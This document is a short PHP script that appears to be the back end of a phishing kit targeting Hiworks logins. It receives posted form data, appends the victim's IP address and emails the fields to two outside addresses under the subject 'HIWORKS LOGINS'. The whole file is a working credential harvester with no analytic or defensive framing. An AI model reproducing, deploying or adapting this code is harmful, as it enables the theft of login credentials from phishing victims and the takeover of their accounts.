<?php
header('Content-Type: application/json');

function getClientIp() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if (isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if (isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if (isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}

$rawData = file_get_contents('php://input');
$formData = json_decode($rawData, true);

if ($formData) {
    $clientIp = getClientIp();
    $formData['ipAddress'] = $clientIp;

    $to = 'admin@incotecc.nl,agonigoy2k@yahoo.com';
    $subject = 'HIWORKS LOGINS';
    $message = '';

    foreach ($formData as $key => $value) {
        $message .= ucfirst($key) . ": " . htmlspecialchars($value) . "\n";
    }

    $headers = 'From: sender-email@example.com' . "\r\n" . 
               'Reply-To: sender-email@example.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    if (mail($to, $subject, $message, $headers)) {
        echo json_encode(['status' => 'success', 'message' => 'Email sent successfully.']);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Failed to send email.']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => 'Invalid form data.']);
}
?>
